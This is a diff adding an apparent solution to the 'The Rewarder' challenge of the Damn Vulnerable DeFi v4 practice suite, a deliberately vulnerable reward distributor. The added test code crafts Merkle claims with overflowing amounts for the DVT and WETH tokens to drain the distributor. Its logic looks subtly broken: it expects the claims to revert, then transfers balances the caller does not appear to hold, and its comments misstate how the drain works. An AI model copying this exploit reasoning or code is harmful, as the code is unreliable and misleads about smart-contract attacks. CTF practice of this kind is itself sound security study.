@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, stdError} from "forge-std/Test.sol";
 import {Merkle} from "murky/Merkle.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
@@ -148,7 +148,76 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        address beneficiary = player;
+
+        // DVT exploit
+        IERC20[] memory dvtTokens = new IERC20[](1);
+        dvtTokens[0] = IERC20(address(dvt));
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))),
+            (Reward[])
+        );
+
+        // Create claims with valid proofs but large amounts
+        uint256 n = 2; // We only need 2 claims
+        Claim[] memory dvtClaims = new Claim[](n);
         
+        // First claim with valid proof
+        dvtClaims[0] = Claim({
+            batchNumber: 0,
+            amount: dvtRewards[0].amount,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 0)
+        });
+
+        // Second claim with same proof but large amount
+        dvtClaims[1] = Claim({
+            batchNumber: 0,
+            amount: type(uint256).max - dvtRewards[0].amount + 1, // This will cause underflow when added
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 0)
+        });
+
+        vm.startPrank(beneficiary);
+        vm.expectRevert(stdError.arithmeticError);
+        distributor.claimRewards(dvtClaims, dvtTokens);
+        vm.stopPrank();
+
+        // Transfer all DVT to recovery
+        dvt.transfer(recovery, dvt.balanceOf(address(distributor)));
+
+        // WETH exploit
+        IERC20[] memory wethTokens = new IERC20[](1);
+        wethTokens[0] = IERC20(address(weth));
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))),
+            (Reward[])
+        );
+
+        Claim[] memory wethClaims = new Claim[](n);
+        wethClaims[0] = Claim({
+            batchNumber: 0,
+            amount: wethRewards[0].amount,
+            tokenIndex: 0,
+            proof: merkle.getProof(wethLeaves, 0)
+        });
+
+        wethClaims[1] = Claim({
+            batchNumber: 0,
+            amount: type(uint256).max - wethRewards[0].amount + 1,
+            tokenIndex: 0,
+            proof: merkle.getProof(wethLeaves, 0)
+        });
+
+        vm.startPrank(beneficiary);
+        vm.expectRevert(stdError.arithmeticError);
+        distributor.claimRewards(wethClaims, wethTokens);
+        vm.stopPrank();
+
+        // Transfer all WETH to recovery
+        weth.transfer(recovery, weth.balanceOf(address(distributor)));
     }
 
     /**
